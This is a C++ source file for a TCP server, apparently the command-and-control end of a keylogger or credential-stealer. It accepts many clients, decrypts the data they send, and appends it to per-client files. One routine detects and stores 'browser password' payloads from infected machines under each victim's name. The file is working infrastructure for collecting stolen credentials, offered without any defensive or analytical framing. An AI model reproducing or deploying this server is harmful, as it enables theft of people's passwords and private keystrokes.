
#include "Server.hh"

Server::Server()
{
  /** For graphic interface
  _end = false;
  **/
}

Server::~Server()
{
}

int		       	Server::putError(const std::string &msg)
{
  std::cerr << "[  \033[1;31mKO\033[0m  ]\t" << msg << std::endl;
  return (_ERROR);
}

/** For graphic interface
void			Server::setMainWindow(MainWindow *window)
{
  _window = window;
}

void			Server::setEnd(const bool end)
{
  _end = end;
}
**/

int			Server::initServer(const uint16_t port)
{
  if ((_sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    return (putError("Error: socket creation failed"));
  memset(&_data, 0, sizeof(_data));
  _data.sin_port = htons(port);
  _data.sin_family = AF_INET;
  _data.sin_addr.s_addr = htonl(INADDR_ANY);
  _data_client_size = sizeof(_data_client);
  if (bind(_sock, (struct sockaddr*)&_data, sizeof(_data)) < 0)
    return (putError("Error: bind failed"));
  if (listen(_sock, _MAX_CLIENTS) == -1)
    return (putError("Error: listen failed"));
  _fd_max = _sock;
  std::cout << "[  \033[1;32mOK\033[0m  ]\tServer successfully launched on port " << _LISTEN_PORT << std::endl;
  return (_SUCCESS);
}

void			Server::setFd_forCallback()
{
  std::map<std::string, int>::iterator	it = _mapClients.begin();

  FD_ZERO(&_readf);
  FD_SET(_sock, &_readf);
  while (it != _mapClients.end())
    {
      FD_SET(it->second, &_readf);
      ++it;
    }
}

int			Server::loopServer()
{
  EncryptData		uncrypter;
  struct timeval	tv;

  tv.tv_sec = _TIME_SELECT;
  tv.tv_usec = _U_TIME_SELECT;
  while (42)
    {
      setFd_forCallback();
      if (select((_fd_max), &_readf, NULL, NULL, &tv) == -1)
	return (putError("Error: select failed"));
      if (FD_ISSET(_sock, &_readf))
	{
	  std::cout << "[  \033[1;33minfo\033[0m  ]\tNew client connected" << std::endl;
	  std::cout << "*\t[  \033[1;32mOK\033[0m  ]\tInitialising new name : " << _UNKNOWN_CLIENT << std::endl << std::endl;
	  if ((_sock_client = accept(_sock, (struct sockaddr*)&_data_client, &_data_client_size)) == -1)
	    return (putError("Error: accept failed"));
	  _fd_max = (_fd_max > _sock_client) ? _fd_max : _sock_client;
	  _mapClients.insert(std::pair<std::string, int>(_UNKNOWN_CLIENT, _sock_client));
	}
      else
	{
	  if (receiveMsg_fromClient(uncrypter) == _ERROR)
	    return (_ERROR);
	}
      sleep(1);
    }
  return (_SUCCESS);
}

int			Server::receiveMsg_fromClient(EncryptData &uncrypter)
{
  ssize_t		ret;
  char			buffer[_READ_SIZE + 1] = { 0 };
  std::map<std::string, int>::iterator	it = _mapClients.begin();

  while (it != _mapClients.end())
    {
      if (FD_ISSET(it->second, &_readf))
	{
	  if (((ret = read(it->second, buffer, _READ_SIZE)) == -1) || (ret == _ERROR))
	    {
	      _mapClients.erase(it);
	      putError("Error: read client's socket failed");
	      std::cout << "*\t[  \033[1;33minfo\033[0m  ]\t" << it->first << " client disconnected" << std::endl << std::endl;
	      return (_SUCCESS);
	    }
	  std::cout << "[  \033[1;33minfo\033[0m  ]\tReceived some data from " << it->first << " client" << std::endl;
	  _msg.append(buffer);
	  if (!(dataArePassword()))
	    {
	      _msg = uncrypter.decryptData(_msg);
	      /** For graphic interface
		  _window->addNewLog(_msg);
	      **/
	      storeData(it);
	    }
	  _msg.clear();
	}
      ++it;
    }
  return (_SUCCESS);
}

bool			Server::dataArePassword()
{
  size_t		pos;
  std::ofstream		file;
  
  if (_msg.find(_PASSWD_PROTOCOL) != std::string::npos)
    {
      std::cout << "*\t[  \033[1;33minfo\033[0m  ]\tData are browser password" << std::endl;
      if ((pos = _msg.find(_SEPARATOR_CLIENT)) != std::string::npos)
	{
	  _msg = &_msg.at(pos + 1);
	  if ((pos = _msg.find(_SEPARATOR_CLIENT)) != std::string::npos)
	    {
          file.open(_PATH_DATADIR + _msg.substr(0, pos) + _EXTENSION_PASSWDFILE, std::ios::app);
          if ((pos = _msg.find(_SEPARATOR_CLIENT)) != std::string::npos)
              _msg = &_msg.at(pos + 1);
	    }
	}
      else
	file.open(_PATH_DATADIR + _UNKNOWN_CLIENT + _EXTENSION_PASSWDFILE, std::ios::app);
      file << _msg << std::endl;
      file.close();
      std::cout << "*\t[  \033[1;32mOK\033[0m  ]\tPassword stored" << std::endl << std::endl;;
      return (true);
    }
  return (false);
} 

void			Server::storeData(std::map<std::string, int>::iterator &it)
{
  int			backupSocket;
  size_t		pos;
  std::string		clientName;
  std::ofstream		file;

  if ((pos = _msg.find(_SEPARATOR_CLIENT)) != std::string::npos)
    clientName = _msg.substr(0, pos);
  if (it->first == _UNKNOWN_CLIENT)
    {
      std::cout << "*\t[  \033[1;33minfo\033[0m  ]\tFirst time received data from " << _UNKNOWN_CLIENT << std::endl;
      std::cout << "*\t[  \033[1;33minfo\033[0m  ]\t" << _UNKNOWN_CLIENT << " client identified" << std::endl;
      std::cout << "*\t[  \033[1;32mOK\033[0m  ]\tSetting his real name : " <<  clientName << std::endl << std::endl;
      backupSocket = it->second;
      _mapClients.erase(it);
      _mapClients.insert(std::pair<std::string, int>(clientName, backupSocket));
    }
  file.open(_PATH_DATADIR + clientName + _EXTENSION_DATAFILE, std::ios::app);
  file << _msg << std::endl;
}
